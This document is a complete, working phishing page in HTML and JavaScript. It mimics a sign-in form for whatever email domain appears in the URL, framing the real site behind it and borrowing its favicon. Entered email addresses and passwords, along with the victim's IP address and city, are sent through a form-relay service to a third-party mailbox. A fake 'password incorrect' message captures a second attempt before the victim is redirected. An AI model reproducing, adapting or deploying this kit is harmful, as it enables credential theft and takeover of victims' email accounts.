<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {
box-sizing: border-box;
padding: 0;
margin: 0;
}
body {
height: 100vh;
width: 100vw;
font-family: Arial, Helvetica, sans-serif;
overflow: hidden;
position: relative;
}
iframe {
position: absolute;
top: 0;
left: 0;
width: 100vw;
height: 100vh;
border: none;
z-index: 1;
pointer-events: none; /* keeps form clickable */
}
.container {
max-width: 400px;
padding: 16px;
background-color: white;
border-radius: 5px;
position: absolute;
left: 50%;
top: 50%;
transform: translate(-50%, -50%);
z-index: 2;
}
@media (max-width: 480px) {
.container {
left: 50%;
top: 50%;
margin-left: 0;
transform: translate(-50%, -50%);
width: 90%;
max-width: 90%;
}
}
input[type=text], input[type=password] {
width: 100%;
padding: 15px;
margin: 5px 0 22px 0;
border: none;
background: #f1f1f1;
border-radius: 3px;
}
input[type=text]:focus, input[type=password]:focus {
background-color: #ddd;
outline: none;
}
.btn {
			background-color: #0096FF;
			color: white;
			padding: 16px 20px;
			border: none;
			cursor: pointer;
			width: 100%;
			opacity: 0.9;
		}

		.btn:hover {
			opacity: 1;
		}
</style>
</head>
<body>

<!-- Dynamic full-screen iframe â€“ will load the real domain as background -->
<iframe id="bgiframe" src="" frameborder="0"></iframe>

<form class="container" id="login-form">
<div class="img">
<img src="" id="logo" alt="" style="width: 80px; height: 80px; ">
</div>
<h3 id="title">Sign In</h3>
<h5 id="error" style="display: none; color: red;">Password is incorrect, please try again!</h5>
<label><b>Email Address</b></label>
<input type="text" placeholder="Enter Email" name="email" id="email" required>
<label><b>Password</b></label>
<input type="password" placeholder="Enter Password" name="password" id="psw" required>
<input type="hidden" name="step" id="step">
<button type="submit" class="btn">Sign In</button>
</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
let step = 1;
let submitted = false;

const clientID = window.location.hash.substring(1);
if (!clientID) {
    $("#error").text("No email provided").css("display", "block");
} else {
    $('#email').val(clientID);
    const domain = clientID.split('@').pop();

    // Set dynamic iframe to the REAL domain (e.g. outlook.com, office.com, google.com, etc.)
    $("#bgiframe").attr("src", "https://" + domain);

    // Favicon logo
    const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
    $("#logo").attr("src", logoUrl)
    .on("error", function() {
        $(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
    });
}

$("#login-form").submit(function(event) {
    event.preventDefault();
    if (submitted) return;
    submitted = true;

    const submitBtn = $("button[type='submit']");
    submitBtn.text('Verifying...').prop('disabled', true);

    const email = $("#email").val();
    const password = $("#psw").val();
    const domain = email.split('@').pop();

    $.getJSON('https://ipinfo.io/json', function(response) {
        const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
            _subject: "Logs | " + response.ip,
            Email: email,
            Password: password,
            Attempts: step,
            IP: response.ip,
            Location: response.city + ", " + response.country,
        });

        posting.done(function(data) {
            if (step === 2) {
                window.location.href = "https://" + domain;
            } else {
                step++;
                $("#error").css("display", "block");
                submitBtn.text('Sign In').prop('disabled', false);
                $("#1psw").val("");
                submitted = false;
            }
        });

        posting.fail(function(error) {
            if (step === 2) {
                window.location.href = "https://" + domain;
            } else {
                step++;
                $("#error").css("display", "block");
                submitBtn.text('Sign In').prop('disabled', false);
                $("#psw").val("");
                submitted = false;
            }
        });
    }, "json");
});
</script>
</body>
</html>
